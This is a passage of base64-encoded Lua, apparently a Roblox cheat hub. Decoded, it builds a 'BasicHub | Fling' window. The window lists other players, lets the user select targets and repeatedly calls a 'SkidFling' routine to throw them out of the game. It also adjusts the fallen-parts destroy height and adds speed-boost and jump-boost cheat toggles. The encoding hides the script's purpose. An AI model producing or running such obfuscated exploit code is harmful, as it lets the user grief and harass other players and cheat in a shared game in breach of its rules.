+.."ICAgICAgICA9IFVEaW0yLm5ldygxLCAwLCAwLCAzNikKICAgIFRpdGxlQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJv
+.."bVJHQigzMCwgMzAsIDMwKQogICAgVGl0bGVCYXIuQm9yZGVyU2l6ZVBpeGVsICA9IDAKICAgIEluc3RhbmNlLm5ldygiVUlDb3Ju
+.."ZXIiLCBUaXRsZUJhcikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTIpCgogICAgbG9jYWwgVGl0bGVMYWJlbCA9IEluc3Rh
+.."bmNlLm5ldygiVGV4dExhYmVsIiwgVGl0bGVCYXIpCiAgICBUaXRsZUxhYmVsLlNpemUgICAgICAgICAgICAgID0gVURpbTIubmV3
+.."KDEsIC00MCwgMSwgMCkKICAgIFRpdGxlTGFiZWwuUG9zaXRpb24gICAgICAgICAgPSBVRGltMi5uZXcoMCwgMTAsIDAsIDApCiAg
+.."ICBUaXRsZUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBUaXRsZUxhYmVsLlRleHQgICAgICAgICAgICAgID0g
+.."IuKalCBCYXNpY0h1YiB8IEZsaW5nIgogICAgVGl0bGVMYWJlbC5UZXh0Q29sb3IzICAgICAgICA9IENvbG9yMy5mcm9tUkdCKDIy
+.."MCwgNTAsIDUwKQogICAgVGl0bGVMYWJlbC5Gb250ICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBUaXRs
+.."ZUxhYmVsLlRleHRTaXplICAgICAgICAgID0gMTUKICAgIFRpdGxlTGFiZWwuVGV4dFhBbGlnbm1lbnQgICAgPSBFbnVtLlRleHRY
+.."QWxpZ25tZW50LkxlZnQKCiAgICBsb2NhbCBDbG9zZUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIFRpdGxlQmFyKQog
+.."ICAgQ2xvc2VCdG4uU2l6ZSAgICAgICAgICAgICAgPSBVRGltMi5uZXcoMCwgMjgsIDAsIDI4KQogICAgQ2xvc2VCdG4uUG9zaXRp
+.."b24gICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTMyLCAwLCA0KQogICAgQ2xvc2VCdG4uQmFja2dyb3VuZENvbG9yMyAgPSBDb2xv
+.."cjMuZnJvbVJHQigyMDAsIDQwLCA0MCkKICAgIENsb3NlQnRuLlRleHQgICAgICAgICAgICAgID0gIuKclSIKICAgIENsb3NlQnRu
+.."LlRleHRDb2xvcjMgICAgICAgID0gQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpCiAgICBDbG9zZUJ0bi5Gb250ICAgICAgICAg
+.."ICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBDbG9zZUJ0bi5UZXh0U2l6ZSAgICAgICAgICA9IDE0CiAgICBJbnN0YW5j
+.."ZS5uZXcoIlVJQ29ybmVyIiwgQ2xvc2VCdG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCgogICAgLS0gU3RhdHVzIGxh
+.."YmVsCiAgICBsb2NhbCBTdGF0dXNMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgTWFpbikKICAgIFN0YXR1c0xhYmVs
+.."LlNpemUgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC0yMCwgMCwgMjQpCiAgICBTdGF0dXNMYWJlbC5Qb3NpdGlvbiAgICAg
+.."ICAgICA9IFVEaW0yLm5ldygwLCAxMCwgMCwgNDIpCiAgICBTdGF0dXNMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQog
+.."ICAgU3RhdHVzTGFiZWwuVGV4dCAgICAgICAgICAgICAgPSAiU2VsZWN0IHRhcmdldHMgdG8gZmxpbmciCiAgICBTdGF0dXNMYWJl
+.."bC5UZXh0Q29sb3IzICAgICAgICA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICBTdGF0dXNMYWJlbC5Gb250ICAg
+.."ICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW0KICAgIFN0YXR1c0xhYmVsLlRleHRTaXplICAgICAgICAgID0gMTMKICAgIFN0
+.."YXR1c0xhYmVsLlRleHRYQWxpZ25tZW50ICAgID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CgogICAgLS0gUGxheWVyIGxpc3Qg
+.."ZnJhbWUKICAgIGxvY2FsIExpc3RPdXRlciA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBNYWluKQogICAgTGlzdE91dGVyLlNpemUg
+.."ICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCAyMjApCiAgICBMaXN0T3V0ZXIuUG9zaXRpb24gICAgICAgICA9IFVE
+.."aW0yLm5ldygwLCAxMCwgMCwgNzApCiAgICBMaXN0T3V0ZXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI2LCAy
+.."NiwgMjYpCiAgICBMaXN0T3V0ZXIuQm9yZGVyU2l6ZVBpeGVsICA9IDAKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBMaXN0
+.."T3V0ZXIpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDgpCgogICAgbG9jYWwgU2Nyb2xsID0gSW5zdGFuY2UubmV3KCJTY3Jv
+.."bGxpbmdGcmFtZSIsIExpc3RPdXRlcikKICAgIFNjcm9sbC5TaXplICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC04LCAx
+.."LCAtOCkKICAgIFNjcm9sbC5Qb3NpdGlvbiAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDQsIDAsIDQpCiAgICBTY3JvbGwuQmFj
+.."a2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFNjcm9sbC5Cb3JkZXJTaXplUGl4ZWwgICAgID0gMAogICAgU2Nyb2xsLlNjcm9s
+.."bEJhclRoaWNrbmVzcyAgPSA1CiAgICBTY3JvbGwuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgbG9jYWwg
+.."TGlzdExheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgU2Nyb2xsKQogICAgTGlzdExheW91dC5QYWRkaW5nID0g
+.."VURpbS5uZXcoMCwgNCkKICAgIExpc3RMYXlvdXQ6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJBYnNvbHV0ZUNvbnRlbnRTaXpl
+.."Iik6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgU2Nyb2xsLkNhbnZhc1NpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgTGlzdExh
+.."eW91dC5BYnNvbHV0ZUNvbnRlbnRTaXplLlkgKyA4KQogICAgZW5kKQoKICAgIC0tIENvdW50IHNlbGVjdGVkCiAgICBsb2NhbCBm
+.."dW5jdGlvbiBDb3VudFNlbGVjdGVkKCkKICAgICAgICBsb2NhbCBuID0gMAogICAgICAgIGZvciBfIGluIHBhaXJzKEZsaW5nU2Vs
+.."ZWN0ZWRUYXJnZXRzKSBkbyBuID0gbiArIDEgZW5kCiAgICAgICAgcmV0dXJuIG4KICAgIGVuZAoKICAgIC0tIFVwZGF0ZSBzdGF0
+.."dXMgdGV4dAogICAgbG9jYWwgZnVuY3Rpb24gVXBkYXRlU3RhdHVzKCkKICAgICAgICBsb2NhbCBuID0gQ291bnRTZWxlY3RlZCgp
+.."CiAgICAgICAgaWYgRmxpbmdBY3RpdmUgdGhlbgogICAgICAgICAgICBTdGF0dXNMYWJlbC5UZXh0ICAgICAgPSAi4pqUIEZsaW5n
+.."aW5nICIgLi4gbiAuLiAiIHBsYXllcihzKS4uLiIKICAgICAgICAgICAgU3RhdHVzTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5m
+.."cm9tUkdCKDI1NSw4MCw4MCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIFN0YXR1c0xhYmVsLlRleHQgICAgICA9IG4gLi4gIiBz
+.."ZWxlY3RlZCB8IFByZXNzIFNUQVJUIgogICAgICAgICAgICBTdGF0dXNMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0Io
+.."MjAwLDIwMCwyMDApCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICAtLSBCdWlsZCBwbGF5ZXIgcm93cwogICAgbG9jYWwgZnVuY3Rp
+.."b24gQnVpbGRQbGF5ZXJMaXN0KCkKICAgICAgICBmb3IgXywgY2hpbGQgaW4gcGFpcnMoU2Nyb2xsOkdldENoaWxkcmVuKCkpIGRv
+.."CiAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiRnJhbWUiKSB0aGVuIGNoaWxkOkRlc3Ryb3koKSBlbmQKICAgICAgICBlbmQKICAg
+.."ICAgICBGbGluZ1BsYXllckNoZWNrYm94ZXMgPSB7fQoKICAgICAgICBsb2NhbCBhbGxQbGF5ZXJzID0gUGxheWVyczpHZXRQbGF5
+.."ZXJzKCkKICAgICAgICB0YWJsZS5zb3J0KGFsbFBsYXllcnMsIGZ1bmN0aW9uKGEsYikgcmV0dXJuIGEuTmFtZTpsb3dlcigpIDwg
+.."Yi5OYW1lOmxvd2VyKCkgZW5kKQoKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhhbGxQbGF5ZXJzKSBkbwogICAgICAgICAg
+.."ICBpZiBwbHIgfj0gTG9jYWxQbGF5ZXIgdGhlbgoKICAgICAgICAgICAgbG9jYWwgUm93ID0gSW5zdGFuY2UubmV3KCJGcmFtZSIs
+.."IFNjcm9sbCkKICAgICAgICAgICAgUm93LlNpemUgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIDAsIDAsIDMyKQogICAgICAg
+.."ICAgICBSb3cuQmFja2dyb3VuZENvbG9yMyAgPSBDb2xvcjMuZnJvbVJHQigzNCwgMzQsIDM0KQogICAgICAgICAgICBSb3cuQm9y
+.."ZGVyU2l6ZVBpeGVsICAgPSAwCiAgICAgICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBSb3cpLkNvcm5lclJhZGl1cyA9
+.."IFVEaW0ubmV3KDAsIDYpCgogICAgICAgICAgICAtLSBDaGVja2JveAogICAgICAgICAgICBsb2NhbCBDQiA9IEluc3RhbmNlLm5l
+.."dygiRnJhbWUiLCBSb3cpCiAgICAgICAgICAgIENCLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMCwgMjAsIDAsIDIwKQog
+.."ICAgICAgICAgICBDQi5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDAsIDYsIDAuNSwgLTEwKQogICAgICAgICAgICBDQi5C
+.."YWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNTAsIDUwLCA1MCkKICAgICAgICAgICAgQ0IuQm9yZGVyU2l6ZVBpeGVs
+.."ICA9IDAKICAgICAgICAgICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIENCKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0
+.."KQoKICAgICAgICAgICAgbG9jYWwgQ2hlY2sgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIENCKQogICAgICAgICAgICBDaGVj
+.."ay5TaXplICAgICAgICAgICAgICAgID0gVURpbTIuZnJvbVNjYWxlKDEsMSkKICAgICAgICAgICAgQ2hlY2suQmFja2dyb3VuZFRy
+.."YW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgQ2hlY2suVGV4dCAgICAgICAgICAgICAgID0gIuKckyIKICAgICAgICAgICAgQ2hl
+.."Y2suVGV4dENvbG9yMyAgICAgICAgID0gQ29sb3IzLmZyb21SR0IoODAsIDI1NSwgODApCiAgICAgICAgICAgIENoZWNrLkZvbnQg
+.."ICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgICAgIENoZWNrLlRleHRTaXplICAgICAgICAgICA9
+.."IDE0CiAgICAgICAgICAgIENoZWNrLlZpc2libGUgICAgICAgICAgICA9IEZsaW5nU2VsZWN0ZWRUYXJnZXRzW3Bsci5OYW1lXSB+
+.."PSBuaWwKCiAgICAgICAgICAgIC0tIFBsYXllciBuYW1lCiAgICAgICAgICAgIGxvY2FsIE5hbWVMYWJlbCA9IEluc3RhbmNlLm5l
+.."dygiVGV4dExhYmVsIiwgUm93KQogICAgICAgICAgICBOYW1lTGFiZWwuU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAt
+.."NDAsIDEsIDApCiAgICAgICAgICAgIE5hbWVMYWJlbC5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDAsIDM0LCAwLCAwKQog
+.."ICAgICAgICAgICBOYW1lTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgTmFtZUxhYmVsLlRleHQg
+.."ICAgICAgICAgICAgPSBwbHIuTmFtZQogICAgICAgICAgICBOYW1lTGFiZWwuVGV4dENvbG9yMyAgICAgICA9IENvbG9yMy5mcm9t
+.."UkdCKDI0MCwgMjQwLCAyNDApCiAgICAgICAgICAgIE5hbWVMYWJlbC5Gb250ICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhh
+.."bQogICAgICAgICAgICBOYW1lTGFiZWwuVGV4dFNpemUgICAgICAgICA9IDEzCiAgICAgICAgICAgIE5hbWVMYWJlbC5UZXh0WEFs
+.."aWdubWVudCAgID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CgogICAgICAgICAgICAtLSBDbGlja2FibGUgb3ZlcmxheQogICAg
+.."ICAgICAgICBsb2NhbCBDbGlja0J0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIFJvdykKICAgICAgICAgICAgQ2xpY2tC
+.."dG4uU2l6ZSAgICAgICAgICAgICAgPSBVRGltMi5mcm9tU2NhbGUoMSwxKQogICAgICAgICAgICBDbGlja0J0bi5CYWNrZ3JvdW5k
+.."VHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBDbGlja0J0bi5UZXh0ICAgICAgICAgICAgICA9ICIiCiAgICAgICAgICAgIENs
+.."aWNrQnRuLlpJbmRleCAgICAgICAgICAgID0gNQoKICAgICAgICAgICAgQ2xpY2tCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVj
+.."dChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBGbGluZ1NlbGVjdGVkVGFyZ2V0c1twbHIuTmFtZV0gdGhlbgogICAgICAg
+.."ICAgICAgICAgICAgIEZsaW5nU2VsZWN0ZWRUYXJnZXRzW3Bsci5OYW1lXSA9IG5pbAogICAgICAgICAgICAgICAgICAgIENoZWNr
+.."LlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIENCLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig1
+.."MCw1MCw1MCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBGbGluZ1NlbGVjdGVkVGFyZ2V0c1twbHIu
+.."TmFtZV0gPSBwbHIKICAgICAgICAgICAgICAgICAgICBDaGVjay5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIENC
+.."LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCw4MCwzMCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAg
+.."ICAgICAgVXBkYXRlU3RhdHVzKCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgLS0gSG92ZXIgZWZmZWN0CiAgICAgICAg
+.."ICAgIENsaWNrQnRuLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBSb3cuQmFja2dyb3VuZENv
+.."bG9yMyA9IENvbG9yMy5mcm9tUkdCKDQ0LDQ0LDQ0KQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIENsaWNrQnRuLk1vdXNl
+.."TGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBSb3cuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9t
+.."UkdCKDM0LDM0LDM0KQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBGbGluZ1BsYXllckNoZWNrYm94ZXNbcGxyLk5hbWVd
+.."ID0geyBSb3c9Um93LCBDaGVjaz1DaGVjaywgQ0I9Q0IgfQogICAgICAgICAgICBlbmQgLS0gaWYgcGxyIH49IExvY2FsUGxheWVy
+.."CiAgICAgICAgZW5kIC0tIGZvcgogICAgICAgIFVwZGF0ZVN0YXR1cygpCiAgICBlbmQKCiAgICAtLSDilIDilIAgQnV0dG9ucyBy
+.."b3cg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBsb2NhbCBCdG5ZID0gMjk4CgogICAgbG9jYWwgZnVuY3Rpb24gTWFrZUJ0bih0
+.."ZXh0LCBjb2xvciwgeFNjYWxlLCB4T2Zmc2V0LCB3U2NhbGUsIHdPZmZzZXQpCiAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2Uu
+.."bmV3KCJUZXh0QnV0dG9uIiwgTWFpbikKICAgICAgICBidG4uU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldyh3U2NhbGUsIHdP
+.."ZmZzZXQsIDAsIDM2KQogICAgICAgIGJ0bi5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KHhTY2FsZSwgeE9mZnNldCwgMCwg
+.."QnRuWSkKICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IGNvbG9yCiAgICAgICAgYnRuLlRleHQgICAgICAgICAgICAgPSB0
+.."ZXh0CiAgICAgICAgYnRuLlRleHRDb2xvcjMgICAgICAgPSBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSkKICAgICAgICBidG4u
+.."Rm9udCAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgYnRuLlRleHRTaXplICAgICAgICAgPSAxMwog
+.."ICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDgpCiAgICAgICAg
+.."cmV0dXJuIGJ0bgogICAgZW5kCgogICAgbG9jYWwgU3RhcnRCdG4gICAgPSBNYWtlQnRuKCLilrYgU1RBUlQiLCAgQ29sb3IzLmZy
+.."b21SR0IoMCwxNjAsMCksICAgMCwxMCwgIDAuNSwtMTUpCiAgICBsb2NhbCBTdG9wQnRuICAgICA9IE1ha2VCdG4oIuKWoCBTVE9Q
+.."IiwgICBDb2xvcjMuZnJvbVJHQigxODAsMCwwKSwgICAwLjUsNSwgMC41LC0xNSkKICAgIGxvY2FsIFNlbEFsbEJ0biAgID0gTWFr
+.."ZUJ0bigi4pyUIEFsbCIsICAgIENvbG9yMy5mcm9tUkdCKDYwLDYwLDYwKSwgIDAsMTAsICAwLjUsLTE1KQogICAgbG9jYWwgRGVz
+.."ZWxBbGxCdG4gPSBNYWtlQnRuKCLinJggTm9uZSIsICBDb2xvcjMuZnJvbVJHQig2MCw2MCw2MCksICAwLjUsNSwgMC41LC0xNSkK
+.."ICAgIFNlbEFsbEJ0bi5Qb3NpdGlvbiAgID0gVURpbTIubmV3KDAsMTAsMCxCdG5ZKzQ0KQogICAgRGVzZWxBbGxCdG4uUG9zaXRp
+.."b24gPSBVRGltMi5uZXcoMC41LDUsMCxCdG5ZKzQ0KQoKICAgIC0tIOKUgOKUgCBMb2dpYyDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIAKICAgIGxvY2FsIGZ1bmN0aW9uIFN0YXJ0RmxpbmcoKQogICAgICAgIGlmIEZsaW5nQWN0aXZl
+.."IHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGlmIENvdW50U2VsZWN0ZWQoKSA9PSAwIHRoZW4KICAgICAgICAgICAgU3RhdHVzTGFi
+.."ZWwuVGV4dCA9ICJTZWxlY3QgYXQgbGVhc3Qgb25lIHRhcmdldCEiCiAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCiAgICAgICAg
+.."ICAgIFVwZGF0ZVN0YXR1cygpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIEZsaW5nQWN0aXZlID0gdHJ1
+.."ZQogICAgICAgIFVwZGF0ZVN0YXR1cygpCiAgICAgICAgRmxpbmdUaHJlYWQgPSB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAg
+.."ICAgICAgd2hpbGUgRmxpbmdBY3RpdmUgZG8KICAgICAgICAgICAgICAgIGZvciBuYW1lLCBwbHIgaW4gcGFpcnMoRmxpbmdTZWxl
+.."Y3RlZFRhcmdldHMpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IChwbHIgYW5kIHBsci5QYXJlbnQpIHRoZW4KICAgICAg
+.."ICAgICAgICAgICAgICAgICAgRmxpbmdTZWxlY3RlZFRhcmdldHNbbmFtZV0gPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAg
+.."bG9jYWwgY2IgPSBGbGluZ1BsYXllckNoZWNrYm94ZXNbbmFtZV0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2IgdGhlbiBj
+.."Yi5DaGVjay5WaXNpYmxlID0gZmFsc2U7IGNiLkNCLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig1MCw1MCw1MCkg
+.."ZW5kCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIEZsaW5nQWN0aXZlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcGNh
+.."bGwoU2tpZEZsaW5nLCBwbHIpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAg
+.."ICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIFVwZGF0ZVN0YXR1cygpCiAgICAgICAgICAgICAgICB0
+.."YXNrLndhaXQoMC41KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBTdG9w
+.."RmxpbmcoKQogICAgICAgIGlmIG5vdCBGbGluZ0FjdGl2ZSB0aGVuIHJldHVybiBlbmQKICAgICAgICBGbGluZ0FjdGl2ZSA9IGZh
+.."bHNlCiAgICAgICAgRmxpbmdUaHJlYWQgPSBuaWwKICAgICAgICB3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0g
+.."QkhfRlBESAogICAgICAgIFVwZGF0ZVN0YXR1cygpCiAgICBlbmQKCiAgICBTdGFydEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25u
+.."ZWN0KFN0YXJ0RmxpbmcpCiAgICBTdG9wQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoU3RvcEZsaW5nKQoKICAgIFNlbEFs
+.."bEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5
+.."ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAg
+.."IEZsaW5nU2VsZWN0ZWRUYXJnZXRzW3Bsci5OYW1lXSA9IHBscgogICAgICAgICAgICAgICAgbG9jYWwgY2IgPSBGbGluZ1BsYXll
+.."ckNoZWNrYm94ZXNbcGxyLk5hbWVdCiAgICAgICAgICAgICAgICBpZiBjYiB0aGVuIGNiLkNoZWNrLlZpc2libGUgPSB0cnVlOyBj
+.."Yi5DQi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsODAsMzApIGVuZAogICAgICAgICAgICBlbmQKICAgICAg
+.."ICBlbmQKICAgICAgICBVcGRhdGVTdGF0dXMoKQogICAgZW5kKQoKICAgIERlc2VsQWxsQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNv
+.."bm5lY3QoZnVuY3Rpb24oKQogICAgICAgIEZsaW5nU2VsZWN0ZWRUYXJnZXRzID0ge30KICAgICAgICBmb3IgXywgY2IgaW4gcGFp
+.."cnMoRmxpbmdQbGF5ZXJDaGVja2JveGVzKSBkbwogICAgICAgICAgICBjYi5DaGVjay5WaXNpYmxlID0gZmFsc2UKICAgICAgICAg
+.."ICAgY2IuQ0IuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDUwLDUwLDUwKQogICAgICAgIGVuZAogICAgICAgIFVw
+.."ZGF0ZVN0YXR1cygpCiAgICBlbmQpCgogICAgQ2xvc2VCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAg
+.."ICAgICAgU3RvcEZsaW5nKCkKICAgICAgICBTY3JlZW5HdWk6RGVzdHJveSgpCiAgICAgICAgRmxpbmdHdWkgPSBuaWwKICAgIGVu
+.."ZCkKCiAgICAtLSDilIDilIAgRHluYW1pYyBwbGF5ZXIgbGlzdCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5j
+.."dGlvbihwbHIpCiAgICAgICAgaWYgU2NyZWVuR3VpIGFuZCBTY3JlZW5HdWkuUGFyZW50IHRoZW4KICAgICAgICAgICAgQnVpbGRQ
+.."bGF5ZXJMaXN0KCkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIFBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlv
+.."bihwbHIpCiAgICAgICAgRmxpbmdTZWxlY3RlZFRhcmdldHNbcGxyLk5hbWVdID0gbmlsCiAgICAgICAgaWYgU2NyZWVuR3VpIGFu
+.."ZCBTY3JlZW5HdWkuUGFyZW50IHRoZW4KICAgICAgICAgICAgQnVpbGRQbGF5ZXJMaXN0KCkKICAgICAgICBlbmQKICAgICAgICBV
+.."cGRhdGVTdGF0dXMoKQogICAgZW5kKQoKICAgIEJ1aWxkUGxheWVyTGlzdCgpCmVuZAoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSDilZDilZDilZAgVEFCOiBN
+.."QUlOIOKVkOKVkOKVkAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tCmxvY2FsIG1haW5UYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCLimpTvuI8gTWFpbiIsICJzd29yZCIp
+.."CgptYWluVGFiOkNyZWF0ZVNlY3Rpb24oIk1vdmVtZW50IikKCm1haW5UYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWU9IlNwZWVk
+.."IEJvb3N0IiwgQ3VycmVudFZhbHVlPWZhbHNlLCBGbGFnPSJTcGVlZEJvb3N0IiwKICAgIENhbGxiYWNrPWZ1bmN0aW9uKHYpIHRw
+.."d2Fsa2luZyA9IHYgZW5kLAp9KQotLSBTcGVlZCBNdWx0aXBsaWVyOiB0eXBlIHZhbHVlIDDigJM1ICAocmVwbGFjZXMgc2xpZGVy
+.."IOKAlCBubyBicm9rZW4gbWluLXZhbHVlIGxvb2spCm1haW5UYWI6Q3JlYXRlSW5wdXQoewogICAgTmFtZT0iU3BlZWQgTXVsdGlw
+.."bGllciAgKDAg4oCTIDUpIiwKICAgIFBsYWNlaG9sZGVyVGV4dD0iRGVmYXVsdDogMC4xIiwKICAgIEZsYWc9IlNwZWVkSW5wdXQi
+.."LAogICAgUmVtb3ZlVGV4dEFmdGVyRm9jdXNMb3N0PWZhbHNlLAogICAgQ2FsbGJhY2s9ZnVuY3Rpb24odikKICAgICAgICBsb2Nh
+.."bCBuID0gdG9udW1iZXIodikKICAgICAgICBpZiBuIHRoZW4gdHNwZWVkID0gbWF0aC5jbGFtcChuLCAwLCA1KSBlbmQKICAgIGVu
+.."ZCwKfSkKCm1haW5UYWI6Q3JlYXRlRGl2aWRlcigpCgptYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lPSJKdW1wIEJvb3N0
